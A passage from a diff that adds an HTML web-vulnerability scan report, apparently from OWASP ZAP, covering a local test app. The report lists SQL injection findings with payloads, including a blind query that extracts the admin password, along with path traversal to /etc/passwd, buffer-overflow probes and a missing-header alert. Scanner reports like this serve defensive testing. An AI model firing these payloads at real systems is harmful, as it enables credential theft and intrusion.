+                <td width="20%">Reference</td><td width="80%"><p>http://projects.webappsec.org/Remote-File-Inclusion</p><p>http://cwe.mitre.org/data/definitions/98.html</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">CWE Id</td><td width="80%">98</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">WASC Id</td><td width="80%">5</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Source ID</td><td width="80%">1</td>
+            </tr>
+            
+        </table>
+        <div class="spacer"></div>
+        <table width="100%" class="results">
+              
+  
+  
+  
+            <tr height="24" class="risk-high">
+                <th width="20%"><a name="high"></a>High (Medium)</th><th width="80%">SQL Injection - SQLite</th>
+            </tr>
+              
+  
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Description</td><td width="80%"><p>SQL injection may be possible.</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/login?password=%27+OR+%271%27+LIKE+%271%27&amp;username=admin</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">password</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Attack</td><td width="80%">' OR '1' LIKE '1'</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">near "OR": syntax error</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/login?password=%27+OR+%271%27+LIKE+%271&amp;username=%27</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">username</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Attack</td><td width="80%">'</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">near "OR": syntax error</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?id=%28SELECT+%28CASE+WHEN+%28SUBSTR%28%28SELECT+password+FROM+users+WHERE+name%3D%27admin%27%29%2C2%2C1%29%3D%27e%27%29+THEN+%28LIKE%28%27ABCDEFG%27%2CUPPER%28HEX%28RANDOMBLOB%28300000000%29%29%29%29%29+ELSE+0+END%29%29%27</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">id</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Attack</td><td width="80%">(SELECT (CASE WHEN (SUBSTR((SELECT password FROM users WHERE name='admin'),2,1)='e') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000))))) ELSE 0 END))'</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">near "WHEN": syntax error</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?comment=%27</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">comment</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Attack</td><td width="80%">'</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">near "Sun": syntax error</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Instances</td><td width="80%">4</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Solution</td><td width="80%"><p>Do not trust client side input, even if there is client side validation in place.  </p><p>In general, type check all data on the server side.</p><p>If the application uses JDBC, use PreparedStatement or CallableStatement, with parameters passed by '?'</p><p>If the application uses ASP, use ADO Command Objects with strong type checking and parameterized queries.</p><p>If database Stored Procedures can be used, use them.</p><p>Do *not* concatenate strings into queries in the stored procedure, or use 'exec', 'exec immediate', or equivalent functionality!</p><p>Do not create dynamic SQL queries using simple string concatenation.</p><p>Escape all data received from the client.</p><p>Apply an 'allow list' of allowed characters, or a 'deny list' of disallowed characters in user input.</p><p>Apply the principle of least privilege by using the least privileged database user possible.</p><p>In particular, avoid using the 'sa' or 'db-owner' database users. This does not eliminate SQL injection, but minimizes its impact.</p><p>Grant the minimum database access that is necessary for the application.</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Other information</td><td width="80%"><p>RDBMS [SQLite] likely, given error message regular expression [near ".+": syntax error] matched by the HTML results.</p><p>The vulnerability was detected by manipulating the parameter to cause a database error message to be returned and recognised</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Reference</td><td width="80%"><p>https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">CWE Id</td><td width="80%">89</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">WASC Id</td><td width="80%">19</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Source ID</td><td width="80%">1</td>
+            </tr>
+            
+        </table>
+        <div class="spacer"></div>
+        <table width="100%" class="results">
+              
+  
+  
+  
+            <tr height="24" class="risk-medium">
+                <th width="20%"><a name="medium"></a>Medium (Medium)</th><th width="80%">!pscanrules.xframeoptions.missing.name!</th>
+            </tr>
+              
+  
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Description</td><td width="80%"><p>!pscanrules.xframeoptions.missing.desc!</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/login?password&amp;username</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Instances</td><td width="80%">1</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Solution</td><td width="80%"><p>!pscanrules.xframeoptions.missing.soln!</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Reference</td><td width="80%"><p>!pscanrules.xframeoptions.missing.refs!</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">CWE Id</td><td width="80%">16</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">WASC Id</td><td width="80%">15</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Source ID</td><td width="80%">3</td>
+            </tr>
+            
+        </table>
+        <div class="spacer"></div>
+        <table width="100%" class="results">
+              
+  
+  
+  
+            <tr height="24" class="risk-medium">
+                <th width="20%"><a name="medium"></a>Medium (Medium)</th><th width="80%">Przepełnienie bufora</th>
+            </tr>
+              
+  
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Description</td><td width="80%"><p>Buffer overflow errors are characterized by the overwriting of memory spaces of the background web process, which should have never been modified intentionally or unintentionally. Overwriting values of the IP (Instruction Pointer), BP (Base Pointer) and other registers causes exceptions, segmentation faults, and other process errors to occur. Usually these errors end execution of the application in an unexpected way. </p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/login?password=%27%20OR%20%271%27%20LIKE%20%271&amp;username=admin</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">username</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">GET http://127.0.0.1:65412/login?password=%27+OR+%271%27+LIKE+%271&amp;username=UoUhmRQAgQieqxUgYqTCipHDFhSAHMceiYSLMvoVTANfEOipsKKApboREMuvWVAXAIBEJCdVuakrmaHOWhEKhmwEwMoSJtWxtKTQMqkswABIJAPoUwNILOwnMfYcYDMnptcGIRjfpGAenwtkiuONAjfhhdwAUZClhyuUaIfZOQQDCFCoOeYLKNnacVpdqNqtZPOorkfWqxJWrkYeWAfitCTSXglCZOMniRSSfQTjywHBmjIQTLbDbnfOaLPaxjkJfHIYsGARSCiYWgfjlWueoLMtfPdWgLYSkNIBImKHnaotoInBXlVoJAwxNgNrCMQhdLPSZtxLVbqPvmtrLwWkkbdvCSmSXFMuJjKeJYKclIlUmqZdpMOlCkByXfvGwebLYWTEglsuvqhIZZilYEyePHGnTaBYsBImAEXUNrUqipRYpxZXVlXcFXcnhNSFJYbMovghAvujYOeyymVYnTRvfnrUbdaBhuvwyhlPWARGLHsUKwPAnaihLJFehPXZJAlQWwIgvFFdCFpemNTdsZRvkeXoEDQZBAfjUbCmRmqbvfMxGxAlPkpGdKONxTfVrarTrGkFJEyteHepMsdBkNHnvAhUquymDMyLTKfBuwDXryYkEwDZQNtGctYHqhXvjdxTlmckrcmiAGDDZXgOXlAmLklwcRFhSvljKTSpKLhUKNZugofkEFahferuUIJaXkRoGMdycXknxOgGecLlGywWvGlcyriAUSLeeBHjAVbgwxvGfBHhOnRwamVkIKBBcYtvcTFlBIgIgOSsrZMIhLglWalrdtNFMGePsmHYFWsyXBETjXcyrOXZbIsFrqGLSXWphHsuvEyjslKVBepCkXlvZBVfKVrHfoMZabJICDdZVtZnAdoOTZnvdoIgYgHmosnmBrycIfERgxRqwFiZGopqZDCUhEuQhtnfYaSJBGSQZfUKylgqftmJBrRabAWhmOKjUyDCmcaguoAbsJNNamRYMhyRGDuJNHfktHSNyALTYYjZvShnqKRDvjkPreGmjXvypBQoruWmsljZjHedqyQCbFwhrOmVYKiynhvmHdIWaawMaxNBuMxoaADsPYTxQDlMElmfdbmjeyPWBOlqgnrdtksJGjYaCgpBRmYIIOFTaYtnKmmfQEBeMIsQvlLrOsvXlHUnVClqIgYiRqTDqMlsVJRUMINeZirjjVqRyuFcSPWGAljOxmmWyElOjccdiswlXwaWrEmkEtgdjhdpFDvFWojRqFmpfrRyJNEmmOSXPnXPeIwsluqnNXpNHVbIIWTTZJplkCSWLZcWalkTPClWrpKKPuiKlCQrpZnuADmLAGoHEVsEtPKNXpPUpBlZBNSqMBGhTsJlNtLpaDVJrAZHGfIYLKTFRfItEHAUqNlsPbdUwQvUFSJCEfYhKPpNpgofqDxLjmYCLKdiqcCfUKMHqDvcyJSUsPaTxDeFFWSOdDKtLlwNeRpAhPfYMgYmVYHVyNHGVDINfNduSaWvaFGRKfcusAUUImMwqHiSmjJZmkAdQSGIVAvZNvQlORQQptTexWsiWgXZeQuxFcfGWuBFYBTkkKWTBgvTapMCdQMxOWZuOuDTcgVqaiOTnMBGxUEovvUTTijPDxQhCWVTReNPYQYWKQBCfXQPKrHaMXkCpxppRtsyxXpkpCsFToVFOIKFReImGlpFYoPpRCcGFVOXPMcTupTRGPZJtkWtyWTFiTYBDrwvmPBddKjiTheCeTtAymRjxlHCUsRCBmEaxbGBaRyTMdVojoXCqncTNjNEmaXCLjbTKmqcVfWymsbbpXDSQQrJmFIFPbIXNkXBQKLeFHFKqvdrxxXWNnoYaeNjRFgpjWBkgjjFbQvDrkLAasXIOWwbwkjMRAJIKEjFsXodbpCAQdaphuCoFJsujYZSFMCvvlYddufJOjsEMygEwLpMkFDpZAceEIabnXyjAxvKUbefbcpNFcwNdllndgBHloPcfBvQOFnVXqayYVoVhhEPstdRkSZikCZgphNXMynPZkUKbfsGJraZmnCKnUEmnnQQiMilVQaiQWSwTJsiJIKbKAGtvIqBVOtNFWjZiUQIrpDoxYKDqwGoBnkJBdXogVmgrcGLFNRU HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Length: 0
+Referer: http://127.0.0.1:65412/
+Host: 127.0.0.1:65412
+
+</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">id</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">GET http://127.0.0.1:65412/?id=tKOqLqsknOhHcLdmaCUsdsNlUjlAVuPMHAMYkPBvsngjLGGGfRsFwsTmlACHFopqYVexdAPrEFhTrtrFIIywdQWFoIQRYPTabBoUidmxDkklKIimeVyOHiwbvldxkKdkDCkVEYTWUfGoZaAMrLOLeaYNCoVyfIYZwfBkxEPiAKgtdTSAbnhJrZVYGDApgWsoEZGYwnKMqqssniExIuBXQxdLaaPrbxOJavdXkpXuQNWsuCqypESOrcQNhnNvTrJNMVXNoUTcpBaiAqBEoWTHeDGuCkkWUlStCBeQIUrsuHxPtqSMgplGGKMIDXWgULcrQZDZWQIiZhytOHmKAWDyoMcBmcTbnPfAeIRCBafslwusybPZhKCdVLtEFeIvhbtndjPiocUqfBUmlaqcaenLMuoCIYEqVcricOYhFLRqEWEmwGrQLBoPukpHWpGtfXmfRdaEjTNlVckMRvCrTlTguSKSQZJWmHsKnSaaoulIQiUyPUIStvlwQmYECcTnbWgFsUlsrBMyhadMUuUPRtvREiyTYhaAUeXrmZqvRAjJrfaxcDCRgJmDQgJVRdDAByuowpGQOgSGFPYnMxeqlxgnMQjpxHAfAhQEkRfowskoJaDTnRVeClhbpyIZnaNuteRlYFMxqigYocFMnjFxISldxANGpLltPLfWoHOrHUmXBVoseQpffRvmBSFQFsxgOKubSGmApPsJVeFIDLsQVaZWHDeAfbNRrHZCDktQOMlGGpfSMVcsSFHaHQHKXCQLjcTtHLqlvyLCSOGDstZmeqQImnrGBBSQxvtgJEqCbFpeFMjtFkFylAVTTfRwaZOgpQRJqegrpjnwKbCQZQQMfUsynsBtRFYfLiFKEGBwJFRaVNjyjUQJyrwVPZoVQgWdEaIqyjcgjjVVUVTqgejkBnIVAmdvDZPDKMNCLJEbknnuJxtwSWfKpdGQaIdJJfGQCyGGuxAaqdLFmKJJRcgKZfNfPFuFEEUnmSumAinirNLfgXKXIHRbKiUlCPehXiZIrmmXcIwLrhlKAhQVXOBGLmUtChNMMvagrkaOnPEajdOsHpmATLGeBgWkRexybmUdIrbRsELXojHgaShZIPORiUrYRnBSAAnxsPXNTuQQJSCqWDcywKYxwxsETvqKBLfELNmnPBpSjeyjxtmTGiOueIDvAxElXdSLISQYMgfvQoZcNqcrVkVbZTmdSaJyOeBsWZcUWBrERDOBcooRuLsMAfESyFSDKWpFZOTtHgrxRGCjNufiEGCxLEewNknXidFwGvfEgDNCFFDHmRxYbHigDRCWyNphvjDRJHlamovaoupAoAUXZtDeQgjumWgJfAfbFVKjsnoDMIQWrceAHevqjuTExCdsdQytMgJrDDomyHNTFZGYvXZVNaRykjTAoRxGPbHItAOMxNOfZtuduDOOOPLDwJYCseVJRnAqFZCmQNdXMFDyadTHbZVFqYkStUKPKNovDvsfQfMMIPsGmRRWSHbQbXwISdMYtlvtZrmnokBtRWxRBnOnhDZBxkQvrkqAsEfSJnnWYKutxBFELUsRovkVoMNJuqVMqsGIfqOHdrNYgAFixAiWZFRVxsyKebSlgEKfgZjvWAsojnAtgwePyiMwZPGxFnpniAOONREtQTiEtEBWqgNgocMotoTtKbIFurAZCcBJoHqJxynAQIhFUIpdJdmBfoidxfThXVnhZdSalhllXqLBruXUaUvKyNLmxdoswJUchqhWweVZjLBttZGikKEyMPYolrFWkhUAWJGLKSIbciGvIxumUiQOodAgonItEDekiOduesCQOvhaKXYGjQjoSGJxuFDhFqTIIXuagZGwpbJxAsMFdVioNmgUpNFCMdTWpuvJswnbwEtbXShDihTvXoEpwHWOrubXFbIrfLJhCFvMKLxTiWhkATeLloZjZiVrRhQuTJZnwncHcwoLnBTKsfRpVYBTyJRPMOAMcMlsxagROXenllOnuplwpjTmHdSqUuAyibtvpEKiycrgFuhHqYKQXtHxlXmbQXAuAQhJxNyjKklSCoGVHiWNpbNmSSJsHbckLkBDykVyyWZEsfWPLQRqwbPgtZZZpmRTfIYKualQXqrT HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Length: 0
+Referer: http://127.0.0.1:65412
+Host: 127.0.0.1:65412
+
+</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">path</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">GET http://127.0.0.1:65412/?path=nuFmVDYRjnRsfrMPneahYNuxOeHLfPYAeBOLKhlVFcfiVGgnsrMeoAOZrltcKvDkFtlTnalgAQtfBVIrKvOxvSewUEUPCIueSferGIlSbtVgBJHZZFQFBQBCSpESdQXwGEoYHZODSHZFbWGVGqfKplnmWYKhhBRcVQGhmlaYIbKOJVYbCjqQnMCkSOMHcwCrjKjlPPyMfcZyVkrusfJvTLDwcmAOvMJoltWrnmFiwFxUIpHuFjgHyIuDPwnXkIujTJqpeeQoBRLVLXvsffSCiNyvMKAhilfdOCjqZhXYAwsAdNgZpANZhfIGYQUGluiPTjLwTMsCrIlxrYhppaXHEmrAQcnBYeOuPqDuMLbbnAeqhsOtcYgwPWEHJsFGDgIIowKYBWeTBMCBdWtXKXeetylPjMRqOLjXsiYIWuGAaThlyuRthrgnayCeQQvhyWNXKCrpgYwoUrTqxkSLbbvlVtrVeMauxMFMgwuTkLYXfSkvWXmYyhBeAfsRUSItjavhnrefYXmhwphpNXJLYpvNkBXLtNnIkylWpkSNumPWFSqbCODlcmwiFDqZUTyNuCUBdcOwwxpesQwHJqoVrDKxWCbdhbsSWFfxVuiGfwJEImqFUOXIAbhZXIFpojXLYTWlBwqNQQBDhkxHFhZrcMKdJXpPpHExkDeasmamQEHhQdMYNTIPdYRGffKbVyPuYBZMEGICOTVKlRRiwGRDMrLRFeoygItjMKVQhFawhlLWYDjOukLkEfcRAVgArZjJDVVGjNZnfJKHkPOMuacEWUXGLBqGvJyhwOQvvvVZwSTEttnkcibfchKprSqSEuDCWNTeBFbsXvyqPGGDqpEmLuQrvcKCNjnJGZxCgjPjQjGMuIbEGZIKXxViJAsauIZllMUuNagCeBMkTNMHNWwyccYbWqFjGOPFscoXqEYhodhiLhPKWrllXktftxhGKNtZHkAZJHSgfGpSADwbtGNQcUChIVbGJxZllnInLTPyQUCetkYxpbmXiFsNCluQUbxkZoBZGWqHDiMcuuJCcewHKJLWsNbIdmEGNosDCRNXcnYeBRnCrDISvvmbUucMlghclwVUPWHvWdZaFBeVGfNcmopWMprKHqspnFjyVQURgqUqYbYWRiLpgrXBpNZjMUGJUnRYUoslOiouAGjrecNsjjZOCABHREefYSTefsUbVUeBgGVWDtTVDUEulodlWSgjbhksofhGLeslgGIxyRsbZxeVVXOkaornvsgmWXAmaxSGHukGcCSHSWysvkxRUXSdreUMACnPCDeAEACYJdrsFuvGNEiHCTWqtwSLFVbBkycxhHZcvrCfWPxTmiQnACrgkEWNOpRItYncwhttYbuxTeAkptbiCihhOYpTicwLUdaFfbGFkwewCPKPNUDDxvBFFRfHsSHYfLUOFhTtdXcZSbKRBMEIEVqylcCliNiBvTPqKtvlFVovJtgtwCyaqFKwjrKeOGPVHdJNXGHhFkIQbJcqhTHjCeEsMQYNIwROVFfbjRvxDlUIbQLAeAmxnASkJLXeiAOOYfQnbYVcjxNRKUdJNZvJWemiBEvuedoeVQHCsQeAawCyyXwXIYTnjCXwaJMyJkefVkxfhXwFrsxwTZorjnRJiiJccrhjIijojvDyHVLjiadxXdfFyWgsTcmjvdsETneBPKDNpFJoANWgdxyeOgFiCQfKwpXdejSFvTlalOtepECKkQvhQJlxHldfVkHsAiTxjbBAPUAVFZOkaMpOxguEIWxNmopbkVtmsmGpYpFepAwiIsKNiBNKLHRoKgpnRDHvQwvoDrIOwFjLwdTLpdlVFIkoWMKRjIFMnfHxkrEhSvQtkDYySRvUmslwpOnNatawSPctwZFcQKtloLJvRIMmdaesGbnpwvfyLYtqTMqoaVdgdjTFXllpfXafJXQUPAbdxFIUPxUvqiGLYIBqITEliEqKdFDCrtpQgULdcINnYjxnGtbLZnjGpltTQDicaSRKjwCaopeScfWfLSewtmgxebyOVQxwXVmpERkcqLCAjqrKbMxKpxmQInIftmjRieKTWfIOZRxFrvvIhgbTSsFOZQEiZLJPdIFlpYraRNPfYWbeQaxl HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Length: 0
+Referer: http://127.0.0.1:65412
+Host: 127.0.0.1:65412
+
+</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?include</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">include</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">GET http://127.0.0.1:65412/?include=NWgCGFEYrCwViNFNfGxAyfEVKPyfMWGLHkPqgcSMYqqeWyNFAVKlRpvdXblyFebGrLVnggghuJyTCcvrDUQngTEfAWqpbJnplYvMTBbkZgFDoivNUxAQKBBjeKEsCqUcFtogwFnumOadVaMvotmbHpUVLygqmbnnvonETjnRYRyfxwXuyVZHApyUeKMxcgyVDsqFyAQPWXiwPsPZFmheuByvxWLbyWywZBCMOqcVNcANurSDlDKBlHHmZgDlhlQJtSaVVTwiULabdEpIrxkVNhYPGYRtRfQIiRbYljfmYjNDEWHkhyBeosApZjnrpuPGqlWBVRtvRoGSSJBBORbaTlrXDOnVAjwAKQMRCnlTIBIjGynfEJChAkFkudntUiClobdlBoNOHiIAWNdvDTpKwHDudSQYsOPpNUqOdUGDaOerGjAalDcEyRZYVbbtsRJmoNXbjQxqkyQPpEaILkQNwAdvCFmuJPFdfGTmbxRSwlpcgUGgjfWCCMVhrhaNtyUPFYmZcLILbIVbZNVfHlvZmPhWyPoxRihjviNguTOMEdIGnQVSyCTyHGsQYseRnXQZbnHtmUiCsajHOrpnerEtgMGIPOIXsyiYIQdlxiBmGIQIZdVqBoEwCpKhCQiKBnfYBQPIiekGdHKqjoOraCFeGudttwpIVxivdVXUvXXoiZfaUeQxcfWjBUprpSIILVPExjWAHCwhCQXoIoGjlebZlKgUnpOZChEBVlnJSBFDLfxWPGQUmhNimfZPlAvacbNTLqdUpTkyOYbGuiXYneNibJPMSfHbeMvnmTcGMDaQhWPplRFnUHNxZlcqBxrRQgYuiGJvERSvsfYjOUoQUghUgnhvFuEAumCUHQbmWGufAARLUsWwKiXowRamidJxqUXdXbGFJHrsyKPXucBmucNChIYVQCjtQGFRnyoxHIwWQDoMTgloxwqkjDefgIEXcTHHUpUWVRnJlRWsNWGYPXhMDHykqYIbSVZqTrwLkqbMUnIQirjBCyEYVMPWZUUCFIAmHAjCjYJgIrZKYXVNFmJZqDUkOWifSwKEbeRwJUhDRrblpMJEoYFVTdpFhKceNhVDErmtYrxOsdadGAfnrqSueMDEZjdtGdOwtaJvjcyPjJTwLisQZuAEZlqglWNFpIWaTTUOmbJMcEsBajPkMIWFUJAEcKVnYRQLJFYTTIxuYiEnjtdvgtatZXWaGfpmkJOfRvLZCvenePfHJhAYcRMdsNvwuBhBeSvrUohNVqQmaxfXZLKaVvsaoBJYPLEWZVmWwkVXuVcKHnhDApARWDefaywBpDppCjpqmAKCuIdMqXklhQdiWqKvmiLSmQyMaGdxUXKJklodGygmuGiGkLafUlsitVQPVlbehsytCAqhxWRjfDWdbCXvAsjMKDJFHlqjUNtMGAKAPsyCWBvuKStxeydwJhZLEBsRDLLElDtFyVpQyJVqEDYFglWFQyoChqEUVAGNuHmNpPmNSnnqFdrsEAorNNUPwMbvFZoQjACdaPlonsTlZEyombQWcqxfOolgJhCtPhPuDsMOZpKZyKXfQEDyDukLRxwwxJMftxQoYyHNEZlVsFDtYjbRvsFQucDqsDNpSlobsjPdNOtklLyXMaMpPuhTSJyAtNuBKrmLGYvLkWeiANYmfAgdmbkKFNISxUPGXplNPVpnicxSJEVcLeUGPAfHhetlSTiHvSOHcALxxdkBdYhFpErNCarLCOpaRDKremqvIidBsEJvxrjfpUUNiREDGVOgkMsjfIljxVubLhMmlBCTBQFntcPJIDbuOxaUQpwrWvIOANFsbGihJLnNVejPVfBkpvYKUFoHktemmwNqEAtxVWlkvAXBAHVfpNHSdEFRXRaEWgSEkcIZfCWmuIgNkdmcEBlnflSvFpsBXYEOGXqgRGrtMaCqCHmjqSKHwkoJyQBgPgnOoVvgWefLmLefodIUWUyWNKCSrqXbiXetNbNKxxulIsyLJyQXBFvAIINLkbOuRKuQDuPZIspWStNXWWuukXcCOjGGJWuBZRhWQMOLlwnChOYNxNpwTQMoVCclGCVEUqsoWvXCfVkRWBpZYQFGYcOVEGTXNvmgvkFuZWXL HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Length: 0
+Referer: http://127.0.0.1:65412
+Host: 127.0.0.1:65412
+
+</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?size=32</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">size</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">GET 